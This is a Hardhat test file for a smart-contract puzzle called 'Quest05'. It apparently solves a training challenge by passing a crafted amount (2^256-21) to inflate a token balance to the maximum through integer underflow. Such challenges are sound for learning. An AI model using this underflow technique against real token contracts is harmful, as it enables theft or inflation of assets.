import { expect } from "chai";
import { BigNumber } from "ethers";
import { ethers } from "hardhat";

describe("Quest05", function () {
  it("Should get additinal tokens", async function () {
    const [owner] = await ethers.getSigners();

    const Token = await ethers.getContractFactory("contracts/Token.sol:Token");
    const token = await Token.deploy(20);
    await token.deployed();

    console.log("token.address:", token.address);

    expect(await token.balanceOf(owner.address)).to.equal(20);

    const Quest = await ethers.getContractFactory("Quest05");
    const quest = await Quest.deploy();
    await quest.deployed();

    console.log("quest05.address:", quest.address);

    const transferTX = await quest.transfer(
      token.address,
      BigNumber.from(2).pow(256).sub(21).toString()
    );
    await transferTX.wait();

    expect(await token.balanceOf(owner.address)).to.equal(
      BigNumber.from(2).pow(256).sub(1).toString()
    );
  });
});
